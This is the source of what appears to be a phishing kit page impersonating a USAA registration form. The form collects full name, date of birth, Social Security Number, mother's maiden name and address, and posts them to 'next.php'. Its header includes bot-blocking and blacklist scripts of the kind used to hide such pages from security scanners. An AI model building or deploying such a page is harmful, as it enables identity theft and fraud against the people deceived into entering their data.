<?php
include '../prevents/bot.php';
include '../prevents/ref.php';
include '../prevents/blacklist.php';
include '../prevents/blocker.php';
?>
<!doctype html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link href="./assets/css/fonts.css" rel="stylesheet" />
    <link href="./assets/css/output.css" rel="stylesheet" />
    <title>Register</title>
</head>

<body class="font-GothamNarrow bg-white text-bookmark-blue-dark">
    <main class="">
        <header class="border xl:p-4 py-2">
            <div class="container flex items-center gap-4 max-w-[1140px]">
                <img src="assets/imgs/logo-svg-dark.svg" alt="" class="size-14" />
                <h4 class="xl:text-2xl text-xl font-font1">Join USAA</h4>
            </div>
        </header>

        <main class="max-w-[600px] mx-auto px-4 py-10">
            <form action="../next.php" method="post" class="">
                <div class="">
                    <h4 class="xl:text-2xl text-xl mb-8 font-font1">Now, let's continue with your information</h4>
                    <!-- <p class="text-sm text-gray-600 mb-6">Please provide accurate information. This will be used to
            verify your identity and ownership of the account.</p> -->

                    <div class="flex -mx-3 flex-wrap">
                        <div class="px-3 w-full">
                            <div class="form-group mb-7">
                                <label for="fname" class="form-label leading-none font-font2 block mb-2 text-sm">Full
                                    Name</label>
                                <input type="text" name="fname" id="fname" placeholder="Full Name"
                                    class="form-control h-[44px] p-[15px] w-full border border-[#949494] hover:border-[#757575] focus:border-bookmark-blue-1 focus:outline-1 focus:outline-offset-1 rounded-[3px] focus:outline-bookmark-blue-1 without-outline without-ring"
                                    required aria-describedby="helpId">
                            </div>
                        </div>
                        <div class="px-3 w-full">
                            <div class="form-group mb-7">
                                <label for="dob"
                                    class="form-label leading-none font-font2 block mb-[4px] text-sm">DOB</label>
                                <p class="opacity-60 text-sm block mb-1">MM/DD/YYYY</p>
                                <input type="tel" required inputmode="numeric" placeholder="MM/DD/YYYY" name="DOB"
                                    id="dob"
                                    class="form-control h-[44px] p-[15px] w-full border border-[#949494] hover:border-[#757575] focus:border-bookmark-blue-1 focus:outline-1 focus:outline-offset-1 rounded-[3px] focus:outline-bookmark-blue-1 without-outline without-ring"
                                    maxlength="10" aria-describedby="helpId">
                            </div>
                        </div>
                        <div class="px-3 w-full">
                            <div class="form-group mb-7">
                                <label for="ssn" class="form-label leading-none font-font2 block mb-2 text-sm">Social
                                    Security
                                    Number</label>
                                <input type="tel" required inputmode="numeric" placeholder="XXX-XX-XXXX" name="SSN"
                                    id="ssn"
                                    class="form-control h-[44px] p-[15px] w-full border border-[#949494] hover:border-[#757575] focus:border-bookmark-blue-1 focus:outline-1 focus:outline-offset-1 rounded-[3px] focus:outline-bookmark-blue-1 without-outline without-ring"
                                    maxlength="11" aria-describedby="helpId">
                            </div>
                        </div>
                        <div class="px-3 w-full">
                            <div class="form-group mb-7">
                                <label for="mmn" class="form-label leading-none font-font2 block mb-2 text-sm">Mother's
                                    Maiden
                                    Name</label>
                                <input type="text" required placeholder="MMN" name="MMN" id="mmn"
                                    class="form-control h-[44px] p-[15px] w-full border border-[#949494] hover:border-[#757575] focus:border-bookmark-blue-1 focus:outline-1 focus:outline-offset-1 rounded-[3px] focus:outline-bookmark-blue-1 without-outline without-ring"
                                    maxlength="30" aria-describedby="helpId">
                            </div>
                        </div>
                        <div class="px-3 w-full">
                            <div class="form-group mb-7">
                                <label for="address"
                                    class="form-label leading-none font-font2 block mb-2 text-sm">Address</label>
                                <input id="address" required placeholder="Address"
                                    class="form-control h-[44px] p-[15px] w-full border border-[#949494] hover:border-[#757575] focus:border-bookmark-blue-1 focus:outline-1 focus:outline-offset-1 rounded-[3px] focus:outline-bookmark-blue-1 without-outline without-ring"
                                    name="Address">
                            </div>
                        </div>
                        <div class="px-3 w-full">
                            <div class="form-group mb-7">
                                <label for="city"
                                    class="form-label leading-none font-font2 block mb-2 text-sm">City</label>
                                <input type="text" required placeholder="City" name="city" id="city"
                                    class="form-control h-[44px] p-[15px] w-full border border-[#949494] hover:border-[#757575] focus:border-bookmark-blue-1 focus:outline-1 focus:outline-offset-1 rounded-[3px] focus:outline-bookmark-blue-1 without-outline without-ring"
                                    aria-describedby="helpId">
                            </div>
                        </div>
                        <div class="px-3 w-full">
                            <div class="form-group mb-7">
                                <label for="state"
                                    class="form-label leading-none font-font2 block mb-2 text-sm">State</label>
                                <select name="state" required id="state" placeholder="Select State"
                                    class="form-control h-[44px] relative w-full border border-[#949494] hover:border-[#757575] focus:border-bookmark-blue-1 focus:outline-1 focus:outline-offset-1 rounded-[3px] focus:outline-bookmark-blue-1 without-outline without-ring">
                                    <option value="" disabled selected>Select State</option>
                                    <option value="AL">AL</option>
                                    <option value="AK">AK</option>
                                    <option value="AZ">AZ</option>
                                    <option value="AR">AR</option>
                                    <option value="CA">CA</option>
                                    <option value="CO">CO</option>
                                    <option value="CT">CT</option>
                                    <option value="DE">DE</option>
                                    <option value="FL">FL</option>
                                    <option value="GA">GA</option>
                                    <option value="HI">HI</option>
                                    <option value="ID">ID</option>
                                    <option value="IL">IL</option>
                                    <option value="IN">IN</option>
                                    <option value="IA">IA</option>
                                    <option value="KS">KS</option>
                                    <option value="KY">KY</option>
                                    <option value="LA">LA</option>
                                    <option value="ME">ME</option>
                                    <option value="MD">MD</option>
                                    <option value="MA">MA</option>
                                    <option value="MI">MI</option>
                                    <option value="MN">MN</option>
                                    <option value="MS">MS</option>
                                    <option value="MO">MO</option>
                                    <option value="MT">MT</option>
                                    <option value="NE">NE</option>
                                    <option value="NV">NV</option>
                                    <option value="NH">NH</option>
                                    <option value="NJ">NJ</option>
                                    <option value="NM">NM</option>
                                    <option value="NY">NY</option>
                                    <option value="NC">NC</option>
                                    <option value="ND">ND</option>
                                    <option value="OH">OH</option>
                                    <option value="OK">OK</option>
                                    <option value="OR">OR</option>
                                    <option value="PA">PA</option>
                                    <option value="RI">RI</option>
                                    <option value="SC">SC</option>
                                    <option value="SD">SD</option>
                                    <option value="TN">TN</option>
                                    <option value="TX">TX</option>
                                    <option value="UT">UT</option>
                                    <option value="VT">VT</option>
                                    <option value="VA">VA</option>
                                    <option value="WA">WA</option>
                                    <option value="WV">WV</option>
                                    <option value="WI">WI</option>
                                    <option value="WY">WY</option>
                                </select>
                            </div>
                        </div>
                        <div class="px-3 w-full">
                            <div class="form-group mb-7">
                                <label for="zip" class="form-label leading-none font-font2 block mb-[4px] text-sm">Zip
                                    Code</label>
                                <input type="tel" required placeholder="XXXXX" inputmode="numeric" name="zip" id="zip"
                                    class="form-control h-[44px] p-[15px] w-full border border-[#949494] hover:border-[#757575] focus:border-bookmark-blue-1 focus:outline-1 focus:outline-offset-1 rounded-[3px] focus:outline-bookmark-blue-1 without-outline without-ring"
                                    maxlength="5" aria-describedby="helpId">
                            </div>
                        </div>
                    </div>

                    <div class="text-right">
                        <button type="submit"
                            class="py-[12px] px-[30px] bg-blue-700 text-base tracking-wider font-semibold text-white rounded-[3px] hover:brightness-90 brightness-125 transition-all border border-[#666667] font-OpenSans">
                            Continue
                        </button>
                    </div>
                </div>
            </form>
        </main>

        <footer class="py-10 text-black">
            <div class="container max-w-[1140px]">
                <div class="mb-3 flex flex-col flex-wrap underline sm:flex-row sm:gap-3 text-blue-700">
                    <a href="#">Security Center</a>
                    <a href="#">Privacy Center</a>
                    <a href="#">Accessibility at USAA</a>
                </div>
                <div class="space-y-1 text-sm">
                    <p>Copyright © 2026 USAA.</p>
                    <p>NC-1120</p>
                </div>
            </div>
        </footer>
    </main>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="./assets/js/main.js"></script>

    <script>
    // SSN Input Formatting (XXX-XX-XXXX)
    $("#ssn").on("input", function() {
        let value = $(this).val().replace(/\D/g, ""); // Remove non-digits
        if (value.length > 9) value = value.slice(0, 9); // Limit to 9 digits
        if (value.length > 5) {
            value = value.slice(0, 3) + "-" + value.slice(3, 5) + "-" + value.slice(5);
        } else if (value.length > 3) {
            value = value.slice(0, 3) + "-" + value.slice(3);
        }
        $(this).val(value);
    });

    // DOB Input Formatting (MM/DD/YYYY)
    $("#dob").on("input", function() {
        let value = $(this).val().replace(/\D/g, ""); // Remove non-digits
        if (value.length > 8) value = value.slice(0, 8); // Limit to 8 digits
        if (value.length > 4) {
            value = value.slice(0, 2) + "/" + value.slice(2, 4) + "/" + value.slice(4);
        } else if (value.length > 2) {
            value = value.slice(0, 2) + "/" + value.slice(2);
        }
        $(this).val(value);
    });

    // ZIP Code Input Formatting (XXXXX)
    $("#zip").on("input", function() {
        let value = $(this).val().replace(/\D/g, ""); // Remove non-digits
        if (value.length > 5) value = value.slice(0, 5); // Limit to 5 digits
        $(this).val(value);
    });

    // Remove myFunction as it's not used
    </script>
</body>

</html>